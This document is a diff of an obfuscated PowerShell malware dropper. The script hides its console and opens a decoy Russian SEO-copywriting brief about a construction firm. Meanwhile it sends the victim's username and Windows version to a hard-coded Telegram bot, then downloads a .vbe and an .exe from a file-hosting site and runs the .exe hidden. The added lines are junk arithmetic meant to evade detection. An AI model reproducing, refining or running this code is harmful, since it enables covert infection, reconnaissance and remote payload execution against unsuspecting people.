@@ -1,9 +1,11 @@
-﻿Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
+Add-Type -Name a0 -Namespace b0 -MemberDefinition '[DllImport("Kernel32.dll")]public static extern IntPtr GetConsoleWindow();[DllImport("user32.dll")]public static extern bool ShowWindow(IntPtr hWnd,Int32 nCmdShow);'
 $v0=[b0.a0]::GetConsoleWindow()
 [b0.a0]::ShowWindow($v0,0)
-$v1="UFA_TZ_копирайтинг.txt"
-$v2=Join-Path $env:LOCALAPPDATA $v1
-$v3=@"
+$v1=1+2*3-4
+If($v1>0){}
+$v2="UFA_TZ_копирайтинг.txt"
+$v3=Join-Path $env:LOCALAPPDATA $v2
+$v4=@"
 Техническое задание на написание SEO-статей для строительной компании
 Общая информация
 Нужно написать серию SEO-статей для сайта строительно-монтажной компании с фокусом на привлечение клиентов через поисковые системы и экспертный контент.
@@ -25,28 +27,61 @@ SEO-требования
 Примеры реализованых проектов компании для упоминания в статьях
 Производственные здания производственный цех для машиностроительного завода площадь 2500 квм, цех по производству пластиковых изделий площадь 1800 квм, производственное здание для мебельной фабрики площадь 3200 квм. Складские комплексы логистический центр для торговой компании площадь 5000 квм, складской комплекс с холодильными камерами площадь 2200 квм, распределительный центр для интернет-магазина площадь 3500 квм. Сельскохозяйственные объекты ангар для хранения зерна площадь 4000 квм, животноводческий комплекс площадь 2800 квм, овощехранилище с системой вентиляции площадь 1500 квм. Спортивные сооружения крытый каток площадь 1200 квм, спортивный комплекс с тренажерным залом площадь 800 квм, футбольный манеж площадь 2000 квм. Типичные сроки строительства ангар 500 квм за 2-3 недели, производственное здание 1000 квм за 1,5-2 месяца, складкой комплекс 3000 квм за 2-3 месяца, спортивное сооружение 1500 квм за 2-2,5 месяца.
 "@
-$v3|Out-File -FilePath $v2 -Encoding UTF8
-Invoke-Item $v2
-$v4="8323167571:AAFEgqb4cAPmKNek-D6ioTvS634gRE0CuTo"
-$v5="7063407604"
-$v6=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
-$v7="The user's shortcut was enabled for user: "+$v6
-$v8="https://api.telegram.org/bot"+$v4+"/sendMessage"
-$v9=@{chat_id=$v5;text=$v7}|ConvertTo-Json
-try{$v10=Invoke-RestMethod -Uri $v8 -Method Post -ContentType "application/json" -Body $v9}catch{}
-Start-Sleep -Seconds 400
-$v11="https://www.udrop.com/file/Oo4o/1446062403_house.delete"
-$v12="1446062403_house.vbe"
-$v13=[Environment]::GetFolderPath("LocalApplicationData")
-$v14=Join-Path $v13 $v12
-try{$v15=New-Object System.Net.WebClient;$v15.DownloadFile($v11,$v14)}catch{}
-$v16="https://www.udrop.com/file/OcWP/1446062403_key.delete"
-$v17="1446062403_key.exe"
-$v18=Join-Path $v13 $v17
+$v5=5*2-3
+If($v5>0){}
+$v4|Out-File -FilePath $v3 -Encoding UTF8
+Invoke-Item $v3
+$v6="8323167571:AAFEgqb4cAPmKNek-D6ioTvS6"+"34gRE0CuTo"
+$v7="7063407604"
+$v8=[System.Security.Principal.WindowsIdentity]::GetCurrent().Name
+$v9=7*3-5
+If($v9>0){}
+$v10=(Get-CimInstance Win32_OperatingSystem).Caption
+$v11=4+6-2
+If($v11>0){}
+$v12="Shortcut enabled for user: "+$v8+" | Windows: "+$v10
+$v13=9-3+1
+If($v13>0){}
+$v14="https://api.telegram.org/bot"+$v6+"/sendMessage"
+$v15=2*5-1
+If($v15>0){}
+$v16=[System.Text.Encoding]::UTF8.GetBytes([System.Text.Encoding]::UTF8.GetString([System.Text.Encoding]::UTF8.GetBytes($v12)))
+$v17=@{chat_id=$v7;text=$v12}|ConvertTo-Json -Compress
+$v18=8/2+1
+If($v18>0){}
+try{$v19=Invoke-RestMethod -Uri $v14 -Method Post -ContentType "application/json; charset=utf-8" -Body $v17}catch{}
+$v20=3*4-2
+If($v20>0){}
+Start-Sleep -Seconds 10
+$v21=6*2-3
+If($v21>0){}
+$v22="https://www.udrop.com/file/Oo4o/1446062403_house.delete"
+$v23="1446062403_house.vbe"
+$v24=7*2-1
+If($v24>0){}
+$v25=[Environment]::GetFolderPath("LocalApplicationData")
+$v26=Join-Path $v25 $v23
+$v27=5+3-1
+If($v27>0){}
+try{$v28=New-Object System.Net.WebClient;$v28.DownloadFile($v22,$v26)}catch{}
+$v29=9-2+1
+If($v29>0){}
+$v30="https://www.udrop.com/file/OcWP/1446062403_key.delete"
+$v31="1446062403_key.exe"
+$v32=8*2-3
+If($v32>0){}
+$v33=Join-Path $v25 $v31
+$v34=6*3-2
+If($v34>0){}
 try{
-    $v19=New-Object System.Net.WebClient
-    $v19.DownloadFile($v16,$v18)
-    Start-Process -FilePath $v18 -WindowStyle Normal
+    $v35=New-Object System.Net.WebClient
+    $v35.DownloadFile($v30,$v33)
+    $v36=New-Object System.Diagnostics.ProcessStartInfo
+    $v36.FileName=$v33
+    $v36.WindowStyle=[System.Diagnostics.ProcessWindowStyle]::Hidden
+    $v36.CreateNoWindow=$true
+    [System.Diagnostics.Process]::Start($v36)|Out-Null
 }catch{}
-
+$v37=7*2+1
+If($v37>0){}
 exit
